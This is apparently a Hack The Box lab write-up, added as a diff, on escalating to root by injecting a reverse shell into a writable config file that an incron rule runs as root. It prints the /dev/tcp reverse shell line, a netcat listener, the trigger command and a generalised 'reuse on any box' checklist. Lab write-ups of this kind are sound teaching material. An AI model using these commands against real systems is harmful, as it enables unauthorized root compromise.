@@ -1,0 +1,57 @@
+# HTB Privesc: Incron + Writable Files
+
+## What Happened
+
+You have a low-priv shell. The box uses **incron** — it watches files, and when they change, it runs commands **as root**. One of those commands uses a config file you can write to. You inject a reverse shell into that config, trigger incron, and get root.
+
+---
+
+## Commands Used
+
+```bash
+# 1. Find writable files
+find /etc -writable 2>/dev/null | head -20
+
+# 2. Check incron rules (what files are watched + what runs as root)
+cat /etc/incron.d/*
+
+# 3. Inject reverse shell into writable config
+echo 'bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" &' >> /etc/dahdi/init.conf
+
+# 4. Start listener (on your machine)
+nc -lvnp YOUR_PORT
+
+# 5. Trigger incron by writing to the watched file
+echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
+
+# 6. Root shell lands on your listener
+```
+
+---
+
+## Reuse on Any Box
+
+```bash
+# Find writable files
+find / -writable 2>/dev/null | grep -v "proc\|sys\|run" | head -30
+
+# Check incron
+cat /etc/incron.d/* 2>/dev/null
+
+# Find the chain: watched file → root command → writable config
+# Inject into the writable config, trigger the watched file, catch shell
+```
+
+---
+
+## Similar Vectors to Check
+
+```bash
+# Cron jobs running writable scripts
+cat /etc/crontab && ls -la /etc/cron.*
+
+# Writable systemd service files
+find /etc/systemd -writable 2>/dev/null
+
+# Writable scripts in root's PATH
+```
